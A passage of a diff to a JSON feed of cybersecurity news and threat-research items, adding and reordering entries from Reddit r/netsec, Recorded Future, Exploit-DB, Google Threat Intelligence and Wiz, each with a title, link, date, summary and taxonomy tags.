+          "products": []
+        }
+      }
+    },
+    {
       "source": "Dark Reading",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -12369,6 +12928,35 @@
       }
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "CVE-2025-52465 geoserver arbitrary file write vulnerability",
+      "link": "https://www.reddit.com/r/netsec/comments/1ufdc3k/cve202552465_geoserver_arbitrary_file_write/",
+      "published": "2026-06-25T15:30:44+00:00",
+      "summary": "submitted by /u/AlbatrossMaximum4489 [link] [comments]",
+      "author": "/u/AlbatrossMaximum4489",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2025-52465"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "vulnerability_disclosure",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "tl;dr sec",
       "cohort": "practitioner_analysis",
       "category": "practitioner_analysis",
@@ -12628,6 +13216,33 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "CargoWise WebTracker - The keys were in the cargo",
+      "link": "https://www.reddit.com/r/netsec/comments/1uf7h8g/cargowise_webtracker_the_keys_were_in_the_cargo/",
+      "published": "2026-06-25T11:34:42+00:00",
+      "summary": "submitted by /u/Mempodipper [link] [comments]",
+      "author": "/u/Mempodipper",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -13166,6 +13781,33 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Exploiting vulnerabilities in Johnson & Johnson web apps",
+      "link": "https://www.reddit.com/r/netsec/comments/1ueiif9/exploiting_vulnerabilities_in_johnson_johnson_web/",
+      "published": "2026-06-24T16:34:14+00:00",
+      "summary": "submitted by /u/EatonZ [link] [comments]",
+      "author": "/u/EatonZ",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -20075,33 +20717,6 @@
       }
     },
     {
-      "source": "Recorded Future",
-      "cohort": "threat_research_primary",
-      "category": "threat_research_primary",
-      "title": "May 2026 CVE Landscape",
-      "link": "https://www.recordedfuture.com/blog/may-2026-cve-landscape",
-      "published": "2026-06-08T00:00:00+00:00",
-      "summary": "In May 2026, Insikt Group® identified 41 high-impact vulnerabilities that should be prioritized for remediation, all of which had a Very Critical Recorded Future Risk Score. This represents a 11% increase from last month.",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Exploit-DB",
       "cohort": "offensive_vulnerability_research",
       "category": "offensive_vulnerability_research",
@@ -20122,6 +20737,33 @@
         "urgency_signals": [],
         "content_type": "low_signal",
         "confidence_tier": "tier_1_offensive_research",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Recorded Future",
+      "cohort": "threat_research_primary",
+      "category": "threat_research_primary",
+      "title": "May 2026 CVE Landscape",
+      "link": "https://www.recordedfuture.com/blog/may-2026-cve-landscape",
+      "published": "2026-06-08T00:00:00+00:00",
+      "summary": "In May 2026, Insikt Group® identified 41 high-impact vulnerabilities that should be prioritized for remediation, all of which had a Very Critical Recorded Future Risk Score. This represents a 11% increase from last month.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_1_primary_research",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -20305,33 +20947,6 @@
       }
     },
     {
-      "source": "Recorded Future",
-      "cohort": "threat_research_primary",
-      "category": "threat_research_primary",
-      "title": "Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage",
-      "link": "https://www.recordedfuture.com/blog/recorded-future-holistic-sourcing-wins",
-      "published": "2026-06-05T00:00:00+00:00",
-      "summary": "Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.",
-      "author": "",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Exploit-DB",
       "cohort": "offensive_vulnerability_research",
       "category": "offensive_vulnerability_research",
@@ -20359,6 +20974,33 @@
         "role_map": {
           "WordPress": "target"
         },
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Recorded Future",
+      "cohort": "threat_research_primary",
+      "category": "threat_research_primary",
+      "title": "Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage",
+      "link": "https://www.recordedfuture.com/blog/recorded-future-holistic-sourcing-wins",
+      "published": "2026-06-05T00:00:00+00:00",
+      "summary": "Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.",
+      "author": "",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_1_primary_research",
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
@@ -23735,38 +24377,6 @@
       "source": "Google Cloud Threat Intelligence",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
-      "title": "2 PhaaS 2 Furious: The Evolution of Chinese-Language Phishing Services",
-      "link": "https://cloud.google.com/blog/topics/threat-intelligence/chinese-language-phishing-services/",
-      "published": "2026-05-25T14:00:00+00:00",
-      "summary": "While Russian-speaking threat actors have historically dominated the phishing-as-a-service (PhaaS) landscape, a rival ecosystem is rapidly growing within the Chinese-language underground. Google Threat Intelligence Group (GTIG) analyzed a dozen current PhaaS offerings in the Chinese underground, all of them mature services and many likely tied intricately to the broader criminal ecosystem in that region. These services not only lower the barrier to entry for Chinese cyber criminals, but reveal broader patterns on the evolution of social engineering and credential theft. Late last year , Google took legal action against one PhaaS provider and has worked since then to endorse legislation and enact technical safeguards against these types of scams. Within this ecosystem, GTIG has observed a fundamental move away from static password harvesting towards real-time interception and tokenization. By utilizing live administration panels, attackers can interact with victims in real-time to captu",
-      "author": "Google Threat Intelligence Group",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng",
-          "credential_theft"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "legal_professional"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_1_primary_research",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Google Cloud Threat Intelligence",
-      "cohort": "threat_research_primary",
-      "category": "threat_research_primary",
       "title": "Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability",
       "link": "https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability/",
       "published": "2026-05-25T14:00:00+00:00",
@@ -23796,6 +24406,38 @@
         "role_map": {
           "KnowledgeDeliver LMS": "target"
         },
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Google Cloud Threat Intelligence",
+      "cohort": "threat_research_primary",
+      "category": "threat_research_primary",
+      "title": "2 PhaaS 2 Furious: The Evolution of Chinese-Language Phishing Services",
+      "link": "https://cloud.google.com/blog/topics/threat-intelligence/chinese-language-phishing-services/",
+      "published": "2026-05-25T14:00:00+00:00",
+      "summary": "While Russian-speaking threat actors have historically dominated the phishing-as-a-service (PhaaS) landscape, a rival ecosystem is rapidly growing within the Chinese-language underground. Google Threat Intelligence Group (GTIG) analyzed a dozen current PhaaS offerings in the Chinese underground, all of them mature services and many likely tied intricately to the broader criminal ecosystem in that region. These services not only lower the barrier to entry for Chinese cyber criminals, but reveal broader patterns on the evolution of social engineering and credential theft. Late last year , Google took legal action against one PhaaS provider and has worked since then to endorse legislation and enact technical safeguards against these types of scams. Within this ecosystem, GTIG has observed a fundamental move away from static password harvesting towards real-time interception and tokenization. By utilizing live administration panels, attackers can interact with victims in real-time to captu",
+      "author": "Google Threat Intelligence Group",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [
+          "phishing_social_eng",
+          "credential_theft"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "legal_professional"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_1_primary_research",
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
@@ -27940,33 +28582,6 @@
       }
     },
     {
-      "source": "Wiz Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Build Fast, Build Secure: Wiz findings are now in Lovable",
-      "link": "https://www.wiz.io/blog/introducing-wiz-lovable-integration",
-      "published": "2026-05-07T13:00:00+00:00",
-      "summary": "With Wiz in Lovable, every builder can catch and fix risks in real time, keeping apps secure as they’re created",
-      "author": "Roi Kessler",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Cloudflare Security",
       "cohort": "cloud_identity_infrastructure",
       "category": "cloud_identity_infrastructure",
@@ -27992,6 +28607,33 @@
         "role_map": {
           "Linux kernel": "target"
         },
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Wiz Research",
+      "cohort": "cloud_identity_infrastructure",
+      "category": "cloud_identity_infrastructure",
+      "title": "Build Fast, Build Secure: Wiz findings are now in Lovable",
+      "link": "https://www.wiz.io/blog/introducing-wiz-lovable-integration",
+      "published": "2026-05-07T13:00:00+00:00",
+      "summary": "With Wiz in Lovable, every builder can catch and fix risks in real time, keeping apps secure as they’re created",
+      "author": "Roi Kessler",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
@@ -36892,7 +37534,7 @@
       "title": "M-Trends 2026: Data, Insights, and Strategies From the Frontlines",
       "link": "https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2026/",
       "published": "2026-03-23T14:00:00+00:00",
-      "summary": "Every year, the cyber threat landscape forces defenders to adapt to evolving adversary tactics, techniques, and procedures (TTPs). In 2025, Mandiant observed a clear divergence in adversary pacing that closely aligns with the trends we have been documenting for defenders over the past year. On one end of the spectrum, cyber criminal groups optimized for immediate impact and deliberate recovery denial. On the other end, sophisticated cyber espionage groups and insider threats optimized for extreme persistence, utilizing unmonitored edge devices and native network functionalities to evade detection. Today, we release M-Trends 2026. Grounded in over 500,000 hours of frontline incident investigations conducted by Mandiant globally in 2025, this report provides a definitive look at the TTPs actively being used in breaches today. aside_block <ListValue: [StructValue([('title', 'M-Trends 2026 is available!'), ('body', <wagtail.rich_text.RichText object at 0x7efdbdfe9160>), ('btn_text', 'Downl",
+      "summary": "Every year, the cyber threat landscape forces defenders to adapt to evolving adversary tactics, techniques, and procedures (TTPs). In 2025, Mandiant observed a clear divergence in adversary pacing that closely aligns with the trends we have been documenting for defenders over the past year. On one end of the spectrum, cyber criminal groups optimized for immediate impact and deliberate recovery denial. On the other end, sophisticated cyber espionage groups and insider threats optimized for extreme persistence, utilizing unmonitored edge devices and native network functionalities to evade detection. Today, we release M-Trends 2026. Grounded in over 500,000 hours of frontline incident investigations conducted by Mandiant globally in 2025, this report provides a definitive look at the TTPs actively being used in breaches today. aside_block <ListValue: [StructValue([('title', 'M-Trends 2026 is available!'), ('body', <wagtail.rich_text.RichText object at 0x7efdbc465af0>), ('btn_text', 'Downl",
       "author": "Jurgen Kutscher",
       "in_window": false,
       "taxonomy": {
